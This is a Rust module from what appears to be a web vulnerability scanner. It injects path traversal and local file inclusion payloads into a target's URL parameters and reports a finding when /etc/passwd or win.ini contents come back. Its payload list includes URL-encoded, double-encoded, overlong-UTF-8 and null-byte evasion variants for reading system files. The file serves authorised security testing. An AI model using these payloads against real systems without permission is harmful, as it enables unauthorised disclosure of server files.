use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;

/// Path Traversal / LFI scanner. Crazy mode adds encodings (..%2f, ....//, null byte).
pub async fn scan(http: &HttpClient, target: &str, params: &[String], mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = if target.contains('?') { target.to_string() } else { format!("{}/?file=../etc/passwd", target.trim_end_matches('/')) };

    let mut payloads = vec![
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];
    if mode == Mode::Crazy {
        payloads.extend(vec![
            "..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc/passwd%00",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "....\\\\....\\\\....\\\\windows\\win.ini",
        ]);
    }
    payloads.truncate(mode.payload_intensity().min(payloads.len()));

    for p in params {
        for pl in &payloads {
            let u = inject(&base, p, pl);
            if let Ok((_st, _h, body, _f)) = http.get(&u).await {
                let lb = body.to_lowercase();
                if lb.contains("root:") && lb.contains(":/bin/") {
                    out.push(Finding::new(Severity::High, "LFI", "Local File Inclusion / Path Traversal", target)
                        .with_param(p).with_payload(pl)
                        .with_evidence("/etc/passwd content leaked")
                        .with_confidence(92));
                } else if lb.contains("[extensions]") || lb.contains("; for 16-bit app support") {
                    out.push(Finding::new(Severity::High, "LFI", "Windows file disclosure (win.ini)", target)
                        .with_param(p).with_payload(pl)
                        .with_confidence(90));
                }
            }
        }
    }
    Ok(out)
}

fn inject(base: &str, key: &str, val: &str) -> String {
    if let Ok(mut u) = url::Url::parse(base) {
        u.query_pairs_mut().append_pair(key, val);
        u.to_string()
    } else {
        format!("{}?{}={}", base, key, val)
    }
}
